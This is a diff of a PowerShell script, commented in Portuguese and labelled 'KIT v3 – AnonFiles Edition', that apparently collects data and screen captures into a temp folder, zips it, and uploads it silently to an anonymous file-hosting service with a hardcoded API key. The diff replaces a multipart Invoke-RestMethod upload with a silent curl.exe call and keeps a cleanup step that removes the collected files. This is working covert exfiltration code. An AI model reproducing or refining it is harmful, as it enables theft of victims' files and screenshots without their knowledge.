@@ -1,9 +1,9 @@
 # ----------
-# KIT v3 – AnonFiles Edition (sem elevação, sem áudio)
+# KIT v3 – AnonFiles Edition (curl nativo, sem Discord)
 # ----------
-$kit = "$env:TEMP\kit"
-$key = "AFtru5qQZX8HN5npouThcNDJtVbe6d"      # chave anonfiles
-$upload = "https://api.anonfilesnew.com/upload?key=$key"
+$kit   = "$env:TEMP\kit"
+$key   = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
+$upUrl = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"
 
 New-Item -ItemType Directory -Path $kit -Force | Out-Null
 
@@ -70,26 +70,8 @@ $g.Dispose(); $bmp.Dispose()
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
 Compress-Archive -Path "$kit\*" -Destination $zip -Force
 
-# 11) Faz upload para AnonFiles
-try {
-    $fileBytes = [System.IO.File]::ReadAllBytes($zip)
-    $fileEnc   = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
-    $boundary  = [System.Guid]::NewGuid().ToString()
-    $crlf      = "`r`n"
+# ---------- ENVIO ANONFILES (curl nativo) ----------
+curl.exe -s -F "file=@`"$zip`"" "$upUrl" | Out-Null
 
-    $body = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $zip)`"",
-        "Content-Type: application/octet-stream",
-        "",
-        $fileEnc,
-        "--$boundary--"
-    ) -join $crlf
-
-    $response = Invoke-RestMethod -Uri $upload -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
-    # opcional: salvar link em log local
-    $response.data.file.url.url | Out-File "$env:TEMP\anon_link.txt" -Encoding UTF8
-} catch {}
-
-# 12) Limpa só a pasta $kit
+# ---------- limpa ----------
 Remove-Item $kit -Recurse -Force
